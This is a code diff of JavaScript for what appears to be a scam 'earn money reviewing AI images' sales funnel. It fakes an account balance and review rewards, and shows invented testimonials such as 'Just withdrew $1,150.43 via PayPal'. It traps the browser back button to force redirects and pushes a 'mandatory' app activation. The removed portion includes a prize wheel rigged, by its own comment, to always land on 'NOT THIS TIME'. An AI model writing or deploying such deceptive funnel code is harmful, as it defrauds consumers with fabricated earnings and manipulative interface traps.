 var headerBal=document.getElementById('header-balance');
-var ctaBtn=document.getElementById('btn-cta'),ctaText=document.getElementById('cta-text');
 var elapsedSec=0;
 
 setInterval(function(){
@@ -479,8 +306,6 @@ function showActivation(){
   activationSection.classList.remove('hidden');
   mandatoryBanner.classList.remove('hidden');
   headerBal.textContent='$1183.52';
-  ctaBtn.className=ctaBtn.className.replace('bg-red-500','bg-emerald-500').replace('shadow-red-500/20','shadow-emerald-500/20');
-  ctaText.textContent='Reviews completed, activate the app to unlock your earnings.';
 }
 
 function onVideoComplete(){
@@ -489,12 +314,6 @@ function onVideoComplete(){
   t1c.style.background='conic-gradient(rgb(16 185 129) 360deg, rgb(16 185 129 / 0.2) 360deg)';
   if(!pitchReached){pitchReached=true;showActivation()}
 }
-
-// Review progress (slowly 0→7%) — stops if user does real reviews
-var rPct=0,autoReviewStopped=false;
-var t2c=document.getElementById('task2-circle'),t2p=document.getElementById('task2-pct');
-var rr=document.getElementById('reviews-remaining');
-setTimeout(function(){var ri=setInterval(function(){if(autoReviewStopped||rPct>=7||rvReviewsOnVsl>0){clearInterval(ri);return}rPct++;var deg=Math.round(rPct*3.6);t2c.style.background='conic-gradient(rgb(16 185 129) '+deg+'deg, rgb(16 185 129 / 0.2) '+deg+'deg)';t2p.textContent=rPct+'%';t2c.className=t2c.className.replace('text-red-500','text-emerald-500');rr.textContent=Math.max(0,15-Math.round(rPct*15/100))},8000)},15000);
 
 // Social proof
 var PEOPLE=[{n:'Grace D.',c:'Amsterdam',a:'/images/user-anna.png',m:'Just completed a review and earned $350.00'},{n:'Ethan S.',c:'Canberra',a:'/images/user-carlos.png',m:'Just withdrew $1,150.43 via PayPal'},{n:'Mia R.',c:'Singapore',a:'/images/user-robert.png',m:'Just completed a review and earned $350.00'},{n:'Noah G.',c:'Vienna',a:'/images/user-anna.png',m:'Just withdrew $1,150.43 via PayPal'}];
@@ -533,222 +352,6 @@ var backTarget='/vsl-2';
 history.pushState(null,'',location.href);
 window.addEventListener('popstate',function(){history.pushState(null,'',location.href);go(backTarget)});
 setTimeout(function(){backTarget='/vsl-3'},300000);
-
-// ========== REVIEWS FLOW ==========
-var REVIEW_IMAGES=[
-  {src:'/images/12-rain-window.webp',prompt:'reflection of city lights in a rain-covered window at night, out-of-focus traffic behind the glass, 1:1 square format',time:'3.4s'},
-  {src:'/images/01-canyon-falls.webp',prompt:'majestic waterfall cascading into turquoise canyon pool, aerial perspective, golden hour lighting',time:'2.8s'},
-  {src:'/images/03-cat-macro.webp',prompt:'extreme macro of a cat\'s eye, shallow depth of field, studio ring light reflection visible',time:'4.1s'},
-  {src:'/images/04-misty-pines.webp',prompt:'foggy pine forest at dawn, sunbeams filtering through branches, moody landscape',time:'3.2s'},
-  {src:'/images/05-coffee-pour.webp',prompt:'overhead view of latte art being poured, barista hands, warm café ambience',time:'2.9s'},
-  {src:'/images/06-rusted-door.webp',prompt:'weathered blue door with rusted hinges, Mediterranean village wall, peeling paint texture',time:'3.7s'},
-  {src:'/images/07-snow-peak.webp',prompt:'snow-capped mountain peak above cloud layer, dramatic sky, telephoto compression',time:'3.0s'},
-  {src:'/images/08-oyster-plate.webp',prompt:'fresh oysters on ice with lemon wedges, top-down food photography, restaurant setting',time:'3.5s'},
-  {src:'/images/09-wet-leaves.webp',prompt:'autumn leaves on wet pavement after rain, bokeh city lights, night macro',time:'2.6s'},
-  {src:'/images/10-linen-folds.webp',prompt:'natural linen fabric folds in soft window light, minimalist textile close-up',time:'3.3s'},
-  {src:'/images/11-corner-diner.webp',prompt:'vintage American corner diner at twilight, neon sign glow, nostalgic urban street',time:'4.0s'},
-  {src:'/images/13-market-stall.webp',prompt:'colorful spice market stall, overhead bins of turmeric and paprika, busy bazaar',time:'3.1s'},
-  {src:'/images/15-bookshop-aisle.webp',prompt:'cozy bookshop aisle with floor-to-ceiling shelves, warm lamp light, reading nook',time:'3.6s'},
-  {src:'/images/review-person-ai.webp',prompt:'portrait of young woman in soft natural light, film grain, 85mm lens look',time:'3.8s'},
-  {src:'/images/review-pancakes-ai.webp',prompt:'stack of fluffy pancakes with maple syrup drizzle, steam rising, breakfast table',time:'2.7s'}
-];
-var rvReviewsDone=4,rvCurrentImg=0,rvCooldownActive=false,rvCooldownSec=0,rvWheelAttempt=0;
-var rvBalance=1150.43;
-var rvReviewsTarget=15,rvReviewsOnVsl=0;
-
-window.closeReviews=function(){document.getElementById('reviews-modal').classList.add('hidden');rvGoStep(0)};
-window.rvGoStep=function(n){for(var i=0;i<6;i++){document.getElementById('rv-step'+i).classList.toggle('hidden',i!==n)}};
-
-// Stars
-document.querySelectorAll('.rv-stars').forEach(function(cont){
-  for(var i=1;i<=5;i++){
-    var star=document.createElement('button');
-    star.type='button';star.className='rv-star text-2xl text-[#e2e8f0] transition';star.textContent='★';star.dataset.val=i;
-    star.addEventListener('click',function(){
-      var v=parseInt(this.dataset.val),siblings=this.parentElement.querySelectorAll('.rv-star');
-      siblings.forEach(function(s){s.classList.toggle('text-amber-400',parseInt(s.dataset.val)<=v);s.classList.toggle('text-[#e2e8f0]',parseInt(s.dataset.val)>v)});
-      checkSubmitReady();
-    });
-    cont.appendChild(star);
-  }
-});
-
-// Tags
-document.querySelectorAll('.rv-tag').forEach(function(t){
-  t.addEventListener('click',function(){this.classList.toggle('bg-emerald-100');this.classList.toggle('text-emerald-700');this.classList.toggle('border-emerald-300');checkSubmitReady()});
-});
-
-function checkSubmitReady(){
-  var allRated=true;
-  document.querySelectorAll('.rv-stars').forEach(function(c){if(!c.querySelector('.text-amber-400'))allRated=false});
-  var anyTag=document.querySelector('.rv-tag.bg-emerald-100');
-  var btn=document.getElementById('rv-submit-btn');
-  if(allRated&&anyTag){btn.className=btn.className.replace('bg-[#e2e8f0]','bg-emerald-500').replace('text-[#64748b]','text-white')}
-}
-
-window.startGenerate=function(){
-  if(rvCooldownActive)return;
-  rvGoStep(1);
-  var img=REVIEW_IMAGES[rvCurrentImg%REVIEW_IMAGES.length];
-  document.getElementById('rv-gen-prompt').textContent=img.prompt.substring(0,45)+'...';
-  document.getElementById('rv-gen-time').textContent=img.time;
-  var spinner=document.querySelector('#rv-gen-spinner circle:nth-child(2)');
-  spinner.style.strokeDashoffset='264';
-  var elapsed=0,total=parseFloat(img.time)*1000;
-  var gi=setInterval(function(){
-    elapsed+=100;
-    var pct=Math.min(elapsed/total,1);
-    spinner.style.strokeDashoffset=String(264-(264*pct));
-    var remain=Math.max(0,(total-elapsed)/1000).toFixed(1);
-    document.getElementById('rv-gen-time').textContent=remain+'s';
-    if(elapsed>=total){clearInterval(gi);showImageReview(img)}
-  },100);
-};
-
-function showImageReview(img){
-  document.getElementById('rv-review-img').src=img.src;
-  document.getElementById('rv-review-prompt').textContent='Prompt: "'+img.prompt+'"';
-  document.querySelectorAll('.rv-star').forEach(function(s){s.classList.remove('text-amber-400');s.classList.add('text-[#e2e8f0]')});
-  document.querySelectorAll('.rv-tag').forEach(function(t){t.classList.remove('bg-emerald-100','text-emerald-700','border-emerald-300')});
-  var btn=document.getElementById('rv-submit-btn');
-  btn.className=btn.className.replace('bg-emerald-500','bg-[#e2e8f0]').replace('text-white','text-[#64748b]');
-  rvGoStep(2);
-}
-
-window.submitReview=function(){
-  var allRated2=true;
-  document.querySelectorAll('.rv-stars').forEach(function(c){if(!c.querySelector('.text-amber-400'))allRated2=false});
-  if(!allRated2||!document.querySelector('.rv-tag.bg-emerald-100'))return;
-  autoReviewStopped=true;
-  rvGoStep(3);
-  setTimeout(function(){
-    var reward=(25+Math.random()*10).toFixed(2);
-    var platformFee=2.99;
-    var evaluator=(parseFloat(reward)-platformFee).toFixed(2);
-    rvBalance+=parseFloat(reward);
-    rvReviewsDone++;
-    rvCurrentImg++;
-    rvReviewsOnVsl++;
-    var remaining=Math.max(0,rvReviewsTarget-rvReviewsOnVsl);
-    document.getElementById('rv-reward-amt').textContent='+$'+reward;
-    document.getElementById('rv-evaluator-amt').textContent='$'+evaluator;
-    document.getElementById('rv-new-balance').textContent='New balance: $'+rvBalance.toFixed(2);
-    document.getElementById('rv-history-count').textContent='View your '+rvReviewsDone+' completed reviews';
-    document.getElementById('reviews-remaining').textContent=remaining;
-    document.getElementById('cta-text').textContent=remaining>0?'Complete '+remaining+' Reviews':'Reviews completed, activate the app to unlock your earnings.';
-    // update task2 progress
-    var rp=Math.min(Math.round(rvReviewsOnVsl/rvReviewsTarget*100),100);
-    var t2c2=document.getElementById('task2-circle'),t2p2=document.getElementById('task2-pct');
-    var deg2=Math.round(rp*3.6);
-    t2c2.style.background='conic-gradient(rgb(16 185 129) '+deg2+'deg, rgb(16 185 129 / 0.2) '+deg2+'deg)';
-    t2p2.textContent=rp+'%';
-    t2c2.className=t2c2.className.replace('text-red-500','text-emerald-500');
-    rvGoStep(4);
-    setTimeout(function(){showPrizeWheel()},3000);
-  },2500);
-};
-
-// Prize wheel
-var WHEEL_PRIZES=[
-  {label:'NOT THIS\nTIME',img:null,color:'#0f172a'},
-  {label:'IPAD',img:'/images/prize-ipad.jpg',color:'#10b981'},
-  {label:'ALEXA',img:'/images/prize-alexa.jpg',color:'#0f172a'},
-  {label:'AIRPODS',img:'/images/prize-airpods.png',color:'#10b981'},
-  {label:'SMART TV',img:'/images/prize-tv.jpg',color:'#0f172a'},
-  {label:'IPHONE 17\nPRO MAX',img:'/images/prize-iphone.png',color:'#10b981'}
-];
-var wheelAngle=0,wheelSpinning=false;
-
-function drawWheel(angle){
-  var canvas=document.getElementById('rv-wheel-canvas');
-  if(!canvas)return;
-  var ctx=canvas.getContext('2d');
-  var cx=140,cy=140,r=130,n=WHEEL_PRIZES.length,arc=2*Math.PI/n;
-  ctx.clearRect(0,0,280,280);
-  ctx.save();ctx.translate(cx,cy);ctx.rotate(angle);
-  for(var i=0;i<n;i++){
-    ctx.beginPath();ctx.moveTo(0,0);ctx.arc(0,0,r,i*arc,(i+1)*arc);ctx.closePath();
-    ctx.fillStyle=WHEEL_PRIZES[i].color;ctx.fill();
-    ctx.strokeStyle='rgba(255,255,255,0.3)';ctx.lineWidth=2;ctx.stroke();
-    ctx.save();ctx.rotate(i*arc+arc/2);
-    ctx.fillStyle='white';ctx.font='bold 9px system-ui';ctx.textAlign='center';
-    var lines=WHEEL_PRIZES[i].label.split('\n');
-    var ty=r*0.65;
-    lines.forEach(function(line,li){ctx.fillText(line,0,ty+li*11)});
-    // prize icon circle
-    var ix=r*0.4,iy=0;
-    ctx.beginPath();ctx.arc(ix,iy,18,0,2*Math.PI);ctx.fillStyle='white';ctx.fill();
-    if(WHEEL_PRIZES[i].img){
-      var imgEl=new Image();imgEl.src=WHEEL_PRIZES[i].img;
-      try{ctx.drawImage(imgEl,ix-14,iy-14,28,28)}catch(e){}
-    } else {
-      ctx.fillStyle='#64748b';ctx.font='bold 18px system-ui';ctx.fillText('×',ix,iy+6);
-    }
-    ctx.restore();
-  }
-  ctx.restore();
-  // center circle
-  ctx.beginPath();ctx.arc(cx,cy,22,0,2*Math.PI);
-  ctx.fillStyle='#10b981';ctx.fill();
-  ctx.fillStyle='white';ctx.font='bold 14px system-ui';ctx.textAlign='center';ctx.fillText('$',cx,cy+5);
-}
-
-function showPrizeWheel(){
-  rvWheelAttempt++;
-  document.getElementById('rv-wheel-attempt').textContent='Attempt '+rvWheelAttempt+' of '+rvReviewsTarget;
-  var prog=document.getElementById('rv-wheel-progress');
-  prog.innerHTML='';
-  for(var i=1;i<=rvReviewsTarget;i++){
-    var bar=document.createElement('div');
-    bar.className='h-1.5 flex-1 rounded-full '+(i<=rvWheelAttempt?'bg-emerald-500':'bg-[#e2e8f0]');
-    prog.appendChild(bar);
-  }
-  document.getElementById('rv-spin-btn').disabled=false;
-  drawWheel(wheelAngle);
-  rvGoStep(5);
-}
-
-window.spinWheel=function(){
-  if(wheelSpinning)return;
-  wheelSpinning=true;
-  document.getElementById('rv-spin-btn').disabled=true;
-  // always land on "NOT THIS TIME" (index 0)
-  var targetAngle=wheelAngle+2*Math.PI*4+Math.PI/6;
-  var startAngle=wheelAngle,startTime=Date.now(),duration=4000;
-  function animateSpin(){
-    var elapsed=Date.now()-startTime;
-    var t=Math.min(elapsed/duration,1);
-    var ease=1-Math.pow(1-t,3);
-    wheelAngle=startAngle+(targetAngle-startAngle)*ease;
-    drawWheel(wheelAngle);
-    if(t<1){requestAnimationFrame(animateSpin)}
-    else{wheelSpinning=false;setTimeout(function(){startCooldown()},1500)}
-  }
-  requestAnimationFrame(animateSpin);
-};
-
-function startCooldown(){
-  rvCooldownActive=true;rvCooldownSec=45;
-  rvGoStep(0);
-  document.getElementById('rv-cooldown-wrap').classList.remove('hidden');
-  document.getElementById('rv-generate-btn').classList.add('opacity-50','pointer-events-none');
-  var cdi=setInterval(function(){
-    rvCooldownSec--;
-    document.getElementById('rv-cooldown-timer').textContent='0:'+String(rvCooldownSec).padStart(2,'0');
-    if(rvCooldownSec<=0){
-      clearInterval(cdi);rvCooldownActive=false;
-      document.getElementById('rv-cooldown-wrap').classList.add('hidden');
-      document.getElementById('rv-generate-btn').classList.remove('opacity-50','pointer-events-none');
-    }
-  },1000);
-}
-
-// preload prize images
-WHEEL_PRIZES.forEach(function(p){if(p.img){var i=new Image();i.src=p.img}});
-// preload review images
-REVIEW_IMAGES.forEach(function(r){var i=new Image();i.src=r.src});
-// draw initial wheel
-setTimeout(function(){drawWheel(0)},500);
 })();
 </script>
 </body>
